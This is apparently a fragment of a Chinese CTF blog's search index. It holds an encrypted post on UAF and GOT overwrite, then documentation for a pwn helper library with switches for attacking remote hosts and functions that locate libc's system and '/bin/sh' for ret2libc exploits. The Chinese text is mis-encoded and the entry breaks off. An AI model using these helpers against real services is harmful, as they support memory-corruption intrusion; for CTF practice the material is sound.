da5eacff7793e1da63567749a0232db357d6287860e809f09ae541f945fcc3464fa423c4dc69bf7fb58a7232ff84c62f002ada9272b36d2dc91c1bcd8679452b7650f016ada98fff87ff2bab624d4dcffcddb4cf561ff5f1cad1dddd32dd7286fe98b9461ee89aa1603220dd83e196968637bb183a6c1b4fafe84969d3c1f11ac5b5130bd47f1dc366ad5a524f3f8d680f3593e37a760702de7f66fea038477a17b24796b8a1126d0a8435b371c20cac11b3a560857f8d9190546da89fa93b70a83bedd24bddd2b670c8f036533b3c28db71c0e104aa523e17a590df68a50e81bf82763e97ac1319d42f464cb50e4b74246d1bcc5320be7b952c7dc468436d27f78f2999291bd7ad9d46325f2d28719600117680e3c1bde518f36b5ca3e712071b36f320b145d625c1a0994d1a31a522a549a20d87c35cb2ff7d2d1c862f679a1811ab8aa072d388df20351fed2fa80f4cf70db8982e99a2152262abb41b63fc1f12cf6460583514d96aa8eaf43f1685b2d95d489758da106f0b973fa5bb50f179358acce0eac4ee39f8df59ff9112a3b292f4edeaad02350758fd78423d043bf7d9be13e9dd5e52bb2f79b2667f0aa233529e9e5ed680b7b67e85351436b56828c8edff0f5d4556738e9f8dd85247276f48d273741d0c5b1d845dff1b84bd2688185c8a56bf2a873d9c9729c98addc5a7ee5ef7c41fc9e0c71f8396bc488d90e400f24e129aa04cd1d7beb65782117d5485a4e1e89d02b6e9340dc8ae4abf5234dd788a483c40bb15cad8d44e678c1248ca002a7c33414ca4b7ce9d0aaed8ab42fe7de55420521fbfabd3c25403659057d46beb31839043e2845ea6c3413423afd3363fa1b312d2b1f91c27deda586d57c535cc784faf62c70318e4c57c321d0482175b5b2326212a981ad55b677a544145a88714d83f8042800b0554a3ae555d63ddea44429cdf517a01a3c34532a5871920d204fd78daee4d7b8ee03d6c89cb8afa5b959d7e4254c6012238e8e375a48ef5734b67182c40f2522224bd3101a9f0c9e1fd573b3a63bc243566f431f4f8f1c76dd8e38c272d7e05078a6056f045725ff9fd45e3ece993e367dadd0f318ed8453cae6510b56227756da3d0f8c4a4605d185f50be532d4876571dfee0bdb45441e2046022544a217fdf7cfc835e6ca7bc914b97017cf089fb7ed3a51a653f9dd1ea25b59385890c47dbea749ed87e8d4c24263637415a9fdfde59431973e4e04362aa15eb5e0a28fcf610d97e8ca45b9987f0b07c86d09d10021e2c4ea10ec072a128bf020ef75990f9deccddcdf908729e36efcecf8d0a15b1a80550cd6eee2d4117dda0b14e048cdd6f853ec3b323323cd44511a775ba263540e30c091af96daf71fe69db0d06f7cd5a264aced141817a9db02a8decbdcfe9b6d6eeca1a1143f0392fae4371604fba092170543a65a6bccc60d072d275ec3cd17ff1983a06f2a14e33638fcdffc80bbb50300e80b862b916660d533fccfbd6127f130912750bcfab910a9634f921926ca989c9e5fae8ad04fdd4832c565b4164d1b07329407b1c9346b49558b680a32a4abc546e2ad40eba76369b422e464fa1a84b398d92da329d6370292f5c0673137ae180549842797ddb9114798119aa7a16897894fab027115a9cf83cb057dbdd60324be8f926c84ca209d5c5fe80908598e51f2f59208d733569df747a0fd705f91a2da0ef546eeba2b43e5b92e7c2b54074a422a7f4a5928e21a3002a24eb807b9c9eadec2e6cd95d273133fb8ccb89452bb3c5be8b1a521846f59594aff69449e65504740e8617bb50bb7d4bce8052e56548b82fa7a9b43db51828bbe40649b17cb0359cfced2297a33ef9c17e8a508506b7da283356933723ecb404b4661c8ebbe12aa117345e30aa48b97d9e310d70f49b158857e3814f326620a829abae365fbf27008f7cd13f419f1834cd9c6d5508224878ad8379782c15eb68a3868dde00a5a6f9667520b5e8cc7f08d343737a13bdb1a2ff34b2c20c5e699cf2a857928f25966f062dc3a43624d42f101d781895d475956743508e1359d68c6680abc09f381ed2339c26dc2f09e46226b36fcde8c264d4bcdf052d720f04ba8878a84397fc08fcb09890c6a7b6342edf0be05e3f2467a1d6c14c84ea9fc53ea0109ecc6644b115fab6b069d7aef8a015328b95360405401e2db1d912929d7d734defef0dee2a47848c2776632ab64037ce73f02d7005a93e7b913f2884c79cf49ce4f7fc8dbe53a53184a6227618b16bb93ad0c20973121cfc8164cfa8aab3eefdba83be9fd5aed840bb32687b95a1f66b3094da173dadda83811f3007f34d3cce0cc2a9f6cd6cc79f99386cfbbf208d6857811d033cfc575d6ad647f5dc2c2ca2674880d4b0b66917a59e1bdbe082d53f44564fe8b668e6814304c9e494f658a7e759816c6b567f861ec9571c212aea701126611d0926a00357d0293018ebfac5915f540a97c5d10708a3d9963be6fc3d9d7ea6345a78313566e3f5e1b8fa4cb3c82d0b13a509b320114e9e18f4919ed89886f70156ff986a20d8429cb7934e1e66010507613fb7d4846c240f3b85805698a14f5d9408b433f2904999ce184bb196dc11fb36a818dac6eea5cdc5d6c2e9c704274dbefb0c640232da3edddd958614a8e1dddf6cbd6373d65a6bbebe6807a4b5569400ea08f435164d919a41c99129ffe7cc8b9239b1cbf357fe7db206a7d9f483a841bcab93a5bf0f322829eb2b0d9f7e6a5da0f385fd2577ad4100516fca7b64fcf43a0e70fee0fe872de5182670b9e864ea049ed50b668a3e9317f000b3bb8551fc62eae31738a5f3db5097f97f15229ebd9826dc43dafdaaa192f0490a8b021d024ad14fc1108d9cccd88161882fdc28604d73debfa681154abcc68898b1953747cd7c862ebd29b34de98415c5193ffab796fd29415e27998d21597354b13459f07d66d501c24fc62bdfed50a5bdce0b7d21bb2a9b2d38dbafb370e3bacff2bb65b7b845dd9396ace26451b5d56fd6ee16065c57f8d5df09c907d46db39eb1654873dc56e46333db0ccb6810d9dbc909b203f0a398b7897a34f288fb162e6d1e0e07ba6eeeaeead9351ef75fc77e360ca4bf8bf269a2b083aee65828647a2ab70e32ab1b70d4142dfd99c8767055a721c7bfe44d6258fe428cc6091f0a77b4f132c152100334ef9ae90c408389f94fb84feaf9be2da80a4677350fd5b7d19f268023a6b6337048d827f176b7ebcd520d2d6cbee6df0116b0e55c587e26b83a9c350b3b7197d3db41b8fd21fabc692ed75529d8e5bfbc7a67ccb5730161696ad67a8edf06491fb49ce6945bf2d3cde2daf79a4b8c15293567e63e174fd0ba1984282b4f9fda6707558c6e3567c8a739019439fdc2628cc01c905b52ccc2df8ca313bed9083f1b9fdeb1da22e66b4cc88c5cdfbee6dff4990c4a854950a7c97ab1fdd3576a3edefd7242c1f25bf3205ff6db2f2d50e2bf3ec83ce9c11ce53abed27420612356653a7bd19cd3cd701cb2c8147483c81a1e761df9b96c301ae8e08f307d66592f00affcf369bab696623192a967ad4813fbf4087f9bd326a429178a281b3f7b2f502012a8a7d671a61423db323376f13895a040476c7995ef350313e323119c5ea6bcda25587a6895a3999ebab4bea94aa0851ef836d5ba8dc9a0e129434d0e24ca1a7328a6fa780073c763cce96c3b4dc2523f8cbfa8828c270bedda06599aef5e8fb29276447962d854daec032e87d9aabcbfd1e6be2ada28323f25596ff860667ce53d118de7a730459159114aeadbbb2fe96da59df630fdd72b4a480086929a86633d3e695e7c1cb2578d2559a742635d269bfcc3bd45d858e605ca25f4ceb461ccb40a6dff991ff11d6cfa6f9d39b7b6ef154bb77a88bb16e40aab35d201bdc756f203f416a35ee094413b268fb0383c4b573672bcfcaf6ee952d3127b2c810a097f597c3cfa544cc3913db3255046d48ea57c0e33dd9b16ee64c82729d758fbdd0cd0ba1f00ac81f33f8e3ef2a6dabc33f3ad0b1439e2e392380c001d952504849cae369bf3e35f7c7a7e6077bba2c06fde0f9fb97538bbaf3524bb89f7b890729f7ea35aa73e6c5781e2785d4665460840f9d3ef1e222098da43017b5a996897f4bf618ee38ddbfacbdf95315c63cffdbc43c3eacadf1285f938e939bee310dff7dddfaeb99e470b00f8c5b47100800fbd809a6c56e5e82fc8ec012145e062887d63abaae140298d30736cd7b59dea6b223f79be967c70d1bab3c8b4aef29f40b3df7ea9b160f5c72923253fa0a8cb7cf5519a1a36540c8890620769b08157fdb5dd70d74dd6954e54add335f0727d5cbd4ab9da7b66e7cf02c9bb36e1b9dba9af071958f9af058ca3ea6864fe16b55814299ab6a95858381afeb1f343c381933a9521178668b8225a10d2a947b9c69a80904433144a723969503fe0bf5110e4bd6f5c14f38edab0f619a5b06ce7282baa96844541f0c41aec1dc3a97407bdb0ee59ced03738ad6783bf8af5dea18156398c46797696baeb146356a2c9dd5bdc2c9648895868ad514b858a3eb7414c4201abc2d97f498fc66455a0869bf6313356332e9f2e8dcc3bc6fc85e98e068d7e1dc424fd5114989f7d6d6aaa73333249d546001fcb60706ab2c7a188832f25988a00ef2e300c00ac0a9c8f04fcb75c26fda1eda2c42a460eb6a152edd6473ba37224c52f4f4aaa04aaf2fb5b02cb767c71f4e14ae9235c5cf1e2c0cc8ed5d8f6524a494b15a5fe2bea53e21a0b9aae88637552420c4c9a14c6dbac6cf87f515bb85d8bb02cc705bc1951f6dcef21f441014429a4df564b80bfd0e948cbdbca3897993c994c30f05338ec18cbbd6a1d314c513ef71674faa8f0515cd4db7df76e95e55350502782fd7b9a9d1bd66337bdc4b321f49a2d490c7783fb7e8cc7ce2b08327fc1cc2b4214f6c2712620e39f36c551c5433d3f7615dda561d4983bbd677dde044338a47565392e764dc2bf8c60bfc825410803ee0c0e365327215dfb51884a29791a51126cc38f2ef6fef9d8320eb16c83d35dfca94baf06597e2a81b003104c379bf1a78908f163c9034b112e59af18330a9baf64a45c2f7b05bd70e0293f08dd0e734691ceceb4c4a7ec0cdf01ee856461e1b97ea95ad4d61fb7e863c5ad4dcf07ea9ef7ebfcf4d79fd11a683348cd2ec9deb3c1bef490443acfcd1dad8a5f9b7cb44dd00566ae8d027f9210e88be38ce0e470ea5bb69ffee5383da892564494890071fb7cdf52b508198f0acb3c30b30d8824b1bd266bfe616de38e0b6a2e09536f5b7b8be3ae757a54ff746d1e32b55a6ce515a4b796fd5a617a7f847d58d3b3efc04c8607b7fa887e7628f889d122e8c945636000b1d2ebd16afc88b3a108daed1c10be9f55dabb0032dadbbf9d4ed2e28a8fa877eabd9cc573fc10024eee3a30177014983911406170a457a3bd295c2823a066fe63ff1611ee984b436bba3b959aafd3d9f9b5c93270df6d18d883aa887f8c39ea1ec377737fe01e9758fb68f9e661d93839900b10b3c6557f6fe44e5c17814243f999c8050e25ac69a56a9584b90289eea0376d98552e30bdc09364b3fea155879ababd5444f25cecec265262d224d27460448411659685641088a3116c5a793a321bd74266f0d773d01ca0048466b98346fc8bf49eefa98fa068520f1dfd21602c1cf0c4e279c6cbe3414fbf79a6103b2ac297af685a2911f1ea8558195e1cd8f323ea78d5f44f764addfaa3678855e593f951144432d421b079ca5470305abf3ac45d61774e7fcb8452ae52cd3e42f3f7a12ecf447b648c430ba825c2cc4cfebf92c06fac1a646aa37b4cbc8fd30701bb781e3114042d7cc8d592437b226d934ff93295b580a49d1e66be22458eafe8f59e5cebffaef19e159223a964c9f7b1ffea593e32cf111463cb3c0a75eed510d15601ae5cf4671a747734f72d13a1fad75e4f87b993fe2e73fc40e2e6dee6ff5e13f10c4e93c46d5ca8b4eeed094faadefa56a84bc20dcf2b5ee414d446830e7a533ff792769c4ae64a7d5d232179bcd32892c1affb8603e276a2ba1531caa41083062f4fa89559a9ad6fe243ace776d9b7faa6b73cc3e8f5991dd7ab54cea0bf79257554e7e034a5f98d110169195521489c9fcd5331701c125a5d85982303b1dded8ad179a46aeebe29bd2e232930b66b0c8ed454d3e1c4074a86731e9d029143f2bc965b2d0c2081c8aa3d6f7372159cc1083c9cdcc6a37b7fccc13f385bd5ff05bf6ea7fe6a2429679b2f0c868a279bdea1768c771d53a364c2ad3bb4fdf6a116fb2c04f044701668397a39f1b51e917e66cd9c3bda8f39f969f2bee460608deb419c949e60c2aa1a68fd342c7274c71c955b8f02f6591b4c15b94fd4d2ea955e2a7b8c74c9c7833e752656d43b5c2506da9c28a4cbed2dcdbe67c604b3f12078c675adf1387e8088346fa9f180c11a701bd96a80de5aeab52090363806c614be7cb28a3503ebe6c8d98c381caa317bcfdc46edaf166c907194522cb292ec1ba34653880fc754acd6333934da39609d19ffb7b2861df9370f7d5f2542d18c18384e17149720e04e2b5926ebd4febd9c6221f18448f94755dba7a699dfba34da46cb69b587c458f037abc4060b5695fd1266dc0e161ad8e264076337bddfdf311fd1abe3e768a1ab7a466690dc760019b4b816003fca095803c7951e3e009aa41a36cb2cb8b4634d5dd094a03c60ba10d8163370b666037287c9430371ecb2a5d906a3f3d509caaa881b383435eada673d7d5d2deba3e9b06a58a74645583c903e3aa07dceecf1330938c6057bb13da91c5346a238db862d9f05f4933918e6107e6fa3944059fd8af77646cf286010dd27c747f33a4c918032d7846e682c0392631c24a71348f4ffb92dd18abcd19d6b281157cf4325b42272fadbebc0a8edfe2216b16230743c67ba371cbdca338d756daeba8aee3c29d18602aaaa1db095e28ef05d3ba6cbd208c9119bc6839abb2d1cfe6e31050f1cb6fae408d44504b11e30ee3393183e904c1f1ac324ce9436ce2d630858f616f515fff5bc81de6922cb2d4ae4766d691aff59cf4348be3165668053c16889be0c5304ebdc780b307201058530a944adc60755cc8c15e6cad9744eb95967c0082d12cc580a92053d6cab5ad5add238ded599d1768550e20a99460bbf61eea520376b80d698e5d26a8f3f0753a7a05ca0908a40270f36ba80c8c0948fd6981335abed85cd87ce211f224cecf97c83f707721f44e4b6fef16d4f1ff0a1dd1f07c70538abf0dc3b2e23cd35db7348f9a4ab93e2f9c5d9b7c98a5ce8d6aab85e6660640f174d2ef7ab3dfb9e97d628c6ba51ce3fea0defb9b6af9b89e893ea2da22403e5fb7b6f6e57f70c035ce808fea285913dc1be15cbb9b05dc41bc82fa557fcd157a2739f3bca9243cea2e793b45cd53edd93540591d6216656d225ac00c59d2de193e9e522c4de00d3fe677ff040dc87da9ab8513d719b41dc9f07a87108fdea6e4b767dee8ef9a71f190731537ab6191d4f7539e1aa4ca02a86d440a0fc1ef165850f76526f9f0655a1aa028987c4cbf750b165972a08754a7562db96c1ef7a71ccbf4b3a55dda5795d0a4934e44c2c2a064f62434ea508f27270017a4776b13bf842ff475d83c7e0b1a2f2d8c40c72cc8ef35ad9bc68fd5596df6330ecefd99844234600f1fa31500672b0bff11ea70546b61e5af53cead4e9f16b46e9e7b5891418af00aa514dffe205313c095a13252738f739589570d3b843f9b504590f6673489793b38abafb6f4e1b717610df2b9e06e7da120d840d9a0999143a7ea87e6b8d9adc2993cb9359940c803bab83c2b407220f53ebb754f8c98b7344ee8fe86f7e2d28b97d97a576162b6442f35918f88dff1ea90425760fff08a81787e9596b74178839d65c05c6ffafa0e671af4e67f3420d63c2f384b645e05a28284bc3175464d5a22539412bacb936f43f6774b98ee750296bebce5f2ecc9bd7022be9d4a6072f5a8ea623eb452e6241cfba47ec8f4cdb3862c75c532b6a2d868ea62d61a26228c864fb13dd8472cde69915eceb7f5e9f99799a4e90963657a1489d20e62c0b1b780be24c105729b5f5c9e867b3b4e6bf6508d68d8917e9701ca5e22175f47789606a0adc8524f299d26eaa0acbeea06329babe98203a4625da772ae384135e5b45514331598f37683a138f84337029725f06a4d00ee40aa51e552b31e595fdab690982f098e8c683842ae5fe2279cc400a12f64128294ea3e64b651d4f10e0d06bd6d364f39fe2dc8d04c26dfc7698a151474f0c0e5e1bc29598b867b32def153fd1a9ab9483f081cffa344e7bf38836d929cd78378c555a0af5dbb26ca2060531ff35f13c268412d887a76a616a019708fccb75a5d60e3e5680b4edea7e31edcda2448e86f1d1a64265829514c46b323e3ea5a54ebaa3e5babc9c685be1b34bc4aa6855eb80356886b4389c0cad6b8c9e3676e44e46d919976af651cd8c9a7067d629f766ac2eab19568d80b82cc6372be77a18764b5936f0f67d3f7df80efa30e57e4d63827c704309b29c4ab7665797eee77e929b21d17f58d1d9f14892ab2b98956eeebce26e7eae9433eb68ff748ddd39b1cdd48d63ac469690bfa14e09721def7e7c85d578b24c84828abc32a452a4ba4e70c2331d936e70f8e3ca8ccb38e82ce015a2c25d4221a22045dc508c2a47d217c8e8047ed211fe71d72123e353ad8d056840430543d71072638e97224277a2069f3b3514810902c79bae746a4cb1fef56cba3f42258ded07de7af751678899c209a4a0c2f6a8f3e0ad94825c43062a70cf632d6c37fea8728b79867a1544fee90c936d0e8c9889f169371078431199514c05c8128e218eab563b9f899b105d139b32ef33697d637030416427da2d1a9cc896dafdd240d6d3acb5dc1f2673129bc6c3d9cd0423fbe62f55f11f82facbde6a78bf407d15689b5755e04375a9eb33e85654aec69c3c207aec532adcac96585e87bb9be3be46ae49803da310b8b6b12fc4aa288712da4ac68b331b95bc32c484c016ed795f7f65a59aad9bdde2b8561e0455f8492c2499496fedec84f7552a475523e578b3b7aae663345da28803fc8ec6ac3f5fd190a74d062a0a2b1effc808bbdc9fa41c26db8befb2712a730aa2cbedbeaef6073bd2f6335236a43f3d5897ed5d859c3a3a2178b27dd116131f3849a117160f1cfba2d26edf6064234e9e659fa5641754c42076870c1230a261955323c14a0a9bb6385a68e46ba1f347d05c5aa011b183b4f684b545fa24688897cfc444aab3fb9d94774721e7a331ff97ad5e3c7f6d79f20a8f9cd51c7fe3c52def5241983f7197f2c0e55f165914186808ac0de7a42d6839184c54de8046f0635be8b67c183609daf8ff2703ee1e78dbd86e53c93b9b2b91a04d8c0db61db43b71e909f8d6c35eef0e0941b4d58c4aeaaf182b2d609318352a82314724b3ca01da8a6174fdc3c7d7c8e9e55b2922ca7d4e191dcb2336336b72bcdbfd8b0817afda7e5501485fc4c2ec6f02c59bd8d56011fd9e0385eb41ed410cb7d07ddeef13571c5a42601ed53b7d201409db89d496b1ccdcc7f42b0e0194589cb7d8d058f3000790819690b6c7e2c02b770fa385753528336fbd2869f433fa87f63e3ba19c29b591c618dacf81618776b4707a39323fc89cb333332e305f2c5b40f1b17a22f2b8afe0e6f6ad5b159fe04c0d89fe5ad1ccbb7e626751e7b7daaa87ce6fa48df9eb381d22adbd39ba096b1c3040adecbe715dc64995b78219886a6725e0adce4982379b3f7cf61c982be05479850426b86f935cbe892d4593ff7a1981d3fc3ac71056b02e3402c48173dc5cdab3e0d158be1c671ec11991829033bcc16af21e302479d372026f4627330ccd53c91031bc1fdd38cf0bb805129c96d596a82a563b04209d0d4cbc652be482b2b7b4532a052d08104252ad95f6e4e65f9e3cdb157cfdc2a9c4348a6092f48a03c25bd71c5466329e4703efe82f261e862b40736066b997efea1b5acc7207684da5da461ccf7e21344999b9b02a1875491836eb9962a1c1be81959e0ef98fd0538a3a036b5db09a6f01543a4f6b4008fae2cfda0b7e87b90bc78c2381f0f0e697c6c11d9adbf0a14b0e084d409b55484956d8c46dad06c0d83eefc023954bb0881ff335142a7d788021012158d8f64d1a69dd9899ffc6e450772ad52901ee8539c905c9156cc3874beaa439e833ab02ad12ba5447d36a5a0cf0e3d31c7547f3d187ac36a144ce7b77c398ec235b005d9fc4d4e181b4a4eab1fd97fe993573988110b5235aed8b6a605fed162645caa89afc910c967e7e64fc8cc30c1f68ec431634041e09d1c362804d70f06da689194f29b70663544bebd9fb7516722542b79a9d9cd521de63ffa905a0b1906249b872f3e8d3f242201f42a447aecdd4cf70cc391ba23e3234815f9289f2b7ea7fd2754dbc3ef34e104060959b5571200e00167c92a69229a8af5e5dfb8ae99e9d44aaa9c0d97fb6a71dbe5505fda989e1a23302a695690f2bb1a4b71ed4d6cc426cef6f2c2c0909514ef0e9ff3593d31a176fe59cfa45a59d25eb86decf335e253b9a319047a232822974af233da9d233710c1d9fc40e0fb37a0bbdf1cddb10a7737bf692acabd5af56812ccdb23f4529556a175ae18dde1cde874bee51b93b974931e6f6afe66228a40ac5f0965d3ee1e48eab6d4791dad92f0a5e6cf2ad918c92b6c2aedde0156b8756ace6493bebd6a7a648b34dee79d7e93f4fa575eb44c88fee7ce8db70ce829de47716ef49fc8d912c10369575841693fb169d62bc3bd85a89918535b98f1d7b481e8d6615a9e4b21474d03cac618d8644265ae132347a84d52530c2d34af7f3d3e5d038795bcebff6748097fcf2962cfc2d130d46284f594a3be2fe0882ebeaabb187f4a1cbcacec5d1102292ea982b985072b3a66be9bd8c891838f37a937be591d874c63c3da8cc133981558db32a4cf9feafd0cfc10242e3abdab69c238b121018ffa9335a26cdecb902a52e3fb1e1263a1df1394a2afcfc09327429af409aa2990a76d6f87a24a94d319666d9993b6b328647c60715c9c6aaf0142e09b9aaad872c4d2c001ae52c77675d03f8d1d14d0610e3c7aaf1796cc4122468ccf0e0c1e03cc86c47d3cad09b44b27849c60b4f53379d2f38e39bec4e7964f0d26b7c66564b55d4</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> ç§æˆ¿èœ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç¯¡æ”¹gotè¡¨ </tag>
            
            <tag> UAF </tag>
            
            <tag> lab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tools-å‡½æ•°åº“</title>
      <link href="/posts/ad411136.html"/>
      <url>/posts/ad411136.html</url>
      
        <content type="html"><![CDATA[<p>æˆ‘å’Œæˆ‘çš„åŒå­¦ <a href="https://www.cnblogs.com/trunk/">trunk</a> å†™äº†ä¸€äº›æ–¹ä¾¿è§£PWNé¢˜çš„<del>é¸¡è‚‹</del>å‡½æ•°å°è£…åˆ°äº†è¿™ä¸ªåº“é‡Œï¼Œç¬¬ä¸€æ˜¯å¹³å¸¸ç”¨èµ·æ¥æ–¹ä¾¿é¡ºæ‰‹ï¼Œç¬¬äºŒé¡ºä¾¿ç»ƒä¹ ä¸‹ç¼–ç¨‹èƒ½åŠ›ï¼Œç¬¬ä¸‰å¦‚æœä»¥åæœ‰å¯èƒ½çš„è¯ï¼Œå¸Œæœ›é€æ¸åšæˆåƒ <strong>roderick</strong> å¸ˆå‚…çš„<a href="https://github.com/RoderickChan/pwncli">pwncli</a>é‚£æ ·ã€‚</p><p><a href="https://github.com/ZIKH26/tools/blob/master/tools.py">æºä»£ç </a></p><p>ä¸€æ¡å‘½ä»¤ä¸‹è½½ <code>tools</code> å‡½æ•°åº“</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/ZIKH26/tools/master/tools.py</span><br></pre></td></tr></table></figure><p><strong><code>tools</code> åº“åªæ”¯æŒpython3</strong></p><h2 id="å‘½ä»¤è¡Œå‚æ•°ï¼š"><a href="#å‘½ä»¤è¡Œå‚æ•°ï¼š" class="headerlink" title="å‘½ä»¤è¡Œå‚æ•°ï¼š"></a>å‘½ä»¤è¡Œå‚æ•°ï¼š</h2><p>ä¸ºäº†ä¸åœ¨æ‰“è¿œç¨‹å’Œæœ¬åœ°ï¼Œä»¥åŠæ‰“æœ¬åœ°æ—¶æ˜¯å¦å¼€å¯è°ƒè¯•é€‰æ‹©ä¸­æ¥ä¸æ–­çš„æ›´æ”¹è„šæœ¬ï¼Œå› æ­¤æˆ‘è®¾ç½®äº†å‘½ä»¤è¡Œå‚æ•°æ¥ç›´æ¥åšåˆ‡æ¢ã€‚</p><p>1 å»æ‰“è¿œç¨‹ä¸”ä¸å¼€å¯è„šæœ¬ä¸­çš„è°ƒè¯•</p><p>2 æ‰“æœ¬åœ°ä¸”ä¸å¼€å¯è„šæœ¬ä¸­çš„è°ƒè¯•</p><p>å¦‚æœä¸åŠ å‘½ä»¤è¡Œå‚æ•°ï¼Œåˆ™é»˜è®¤æ‰“æœ¬åœ°ï¼Œè‹¥æœ‰debugå‡½æ•°åˆ™è‡ªåŠ¨å¼€å¯è°ƒè¯•ã€‚</p><p>å‡è®¾ä½ ç°åœ¨æƒ³æ‰“è¿œç¨‹</p><p>é‚£ä¹ˆä½ éœ€è¦åœ¨è„šæœ¬é‡Œå†™<code>p,e,libc=load(&quot;heap&quot;,&quot;node4.buuoj.cn:27339&quot;)</code> (ç¨‹åºåå’Œip&amp;portè¯·è‡ªè¡Œæ›´æ”¹ï¼Œè¿™é‡Œåªæ˜¯ä¸¾ä¾‹è¯´æ˜)</p><p>ç„¶åè¿è¡Œè„šæœ¬æ—¶ä½¿ç”¨å‘½ä»¤ å¦‚ä¸‹(å³ä½¿è„šæœ¬ä¸­æœ‰debugå‡½æ•°ä¹Ÿä¸å½±å“æ‰“è¿œç¨‹)</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 exp.py 1</span><br></pre></td></tr></table></figure><p>å¦‚æœæ‰“æœ¬åœ°æ—¶ï¼Œä¸æƒ³å»è®©è„šæœ¬æ‰§è¡Œdebugå‡½æ•°ï¼Œé‚£ä¹ˆå‘½ä»¤å¯ä»¥å¦‚ä¸‹(è¿™æ ·çš„å¥½å¤„æ˜¯å³ä½¿è„šæœ¬ä¸­å­˜åœ¨debugå‡½æ•°ï¼Œä½†ä¸æƒ³åœ¨æœ¬æ¬¡æ‰§è¡Œè„šæœ¬æ—¶debugä¹Ÿä¸éœ€è¦æ¥å›å»è„šæœ¬é‡Œæ³¨é‡Šäº†)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 exp.py 2</span><br></pre></td></tr></table></figure><p><strong>å¦‚æœç›´æ¥è¿è¡Œexp.pyçš„è¯ï¼Œå³ä½¿è„šæœ¬é‡Œå­˜åœ¨ipå’Œportä¹Ÿä¸ä¼šå»æ‰“è¿œç¨‹</strong></p><p>æ­¤å¤–ï¼Œå‡è®¾ä½ æ‰“æœ¬åœ°æ‰€ä¾èµ–çš„libcæ˜¯2.23-0ubuntu11.3ç‰ˆæœ¬ è€Œè¿œç¨‹æœåŠ¡å™¨ç¨‹åºæ‰€ä¾èµ–çš„libcæ˜¯2.23-0ubuntu11ç‰ˆæœ¬ã€‚äºŒè€…ä»…ä»…æ˜¯å°ç‰ˆæœ¬æœ‰ç»†å¾®çš„ä¸åŒï¼Œå¯èƒ½one_gadgetå’Œä¸€äº›libcé‡Œå‡½æ•°çš„åç§»æœ‰ç‚¹ä¸åŒï¼Œå¦‚æœæ¥å›å»ä¿®æ”¹çš„è¯ï¼Œæœ‰ç‚¹éº»çƒ¦ï¼Œå› æ­¤åœ¨loadå‡½æ•°çš„ç¬¬ä¸‰ä¸ªå‚æ•°å¯ä»¥è®¾ç½®è¿œç¨‹ä¾èµ–çš„libcï¼Œè¿™æ ·ç”¨åé¢search_ogå‡½æ•°æˆ–è€…libc.symbolsæ‰¾çš„å‡½æ•°åœ°å€éƒ½ä¼šè‡ªåŠ¨åˆ‡æ¢åˆ°è¿œç¨‹æ‰€ä¾èµ–çš„libcã€‚</p><p>ç¤ºä¾‹å¦‚ä¸‹:</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:29026&quot;</span>,<span class="string">&quot;libc-2.23.so&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="å„ä¸ªå‡½æ•°çš„ä½¿ç”¨è¯´æ˜"><a href="#å„ä¸ªå‡½æ•°çš„ä½¿ç”¨è¯´æ˜" class="headerlink" title="å„ä¸ªå‡½æ•°çš„ä½¿ç”¨è¯´æ˜"></a>å„ä¸ªå‡½æ•°çš„ä½¿ç”¨è¯´æ˜</h2><h3 id="long-search-amp-local-search"><a href="#long-search-amp-local-search" class="headerlink" title="long_search&amp;local_search"></a>long_search&amp;local_search</h3><p>ä½œç”¨ï¼šè¿™ä¸¤ä¸ªå‡½æ•°å°±æ˜¯å»libcä¸­å¯»æ‰¾systemå‡½æ•°å’Œ&#x2F;bin&#x2F;shçš„åœ°å€ï¼ˆåˆ†åˆ«ç”¨äºæœ¬åœ°å’Œè¿œç¨‹ï¼‰<br>ä¼˜ç‚¹ï¼šå°†ç”¨LibcSearcheræœç´¢å¹¶è£…è½½çš„é‡å¤çš„ä»£ç éƒ½æ”¾åˆ°äº†å‡½æ•°å†…éƒ¨ï¼Œç°åœ¨ä¸€è¡Œå°±å¯ä»¥è·å–systemå’Œ&#x2F;bin&#x2F;shåœ°å€ï¼Œå› æ­¤æ‚¨çš„è„šæœ¬çœ‹èµ·æ¥æ›´ä¸ºç®€æ´ã€‚</p><p>ä½¿ç”¨èŒƒä¾‹</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sys_addr,bin_sh_addr=long_search(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line"></span><br><span class="line">sys_addr,bin_sh_addr=local_search(<span class="string">&#x27;puts&#x27;</span>,puts_addr,libc)</span><br><span class="line"><span class="string">&quot;&quot;&quot;libcæŒ‡çš„æ˜¯è£…è½½æœ¬åœ°çš„libc,ä¾‹å¦‚åœ¨è„šæœ¬å¼€å§‹å£°æ˜&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)&quot;&quot;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="log"><a href="#log" class="headerlink" title="log"></a>log</h3><p>ä½œç”¨ï¼šè¿™ä¸ªå‡½æ•°å°±æ˜¯å•çº¯çš„æ‰“å°ä¸€ä¸‹æŸäº›å˜é‡çš„ä¿¡æ¯ï¼Œç±»ä¼¼äºæ—¥å¿—ï¼ˆä½†æˆ‘æ›´å»ºè®®å»ä½¿ç”¨ä¸‹é¢çš„log_addrå‡½æ•°ï¼‰<br>ä¼˜ç‚¹ï¼šåŠ 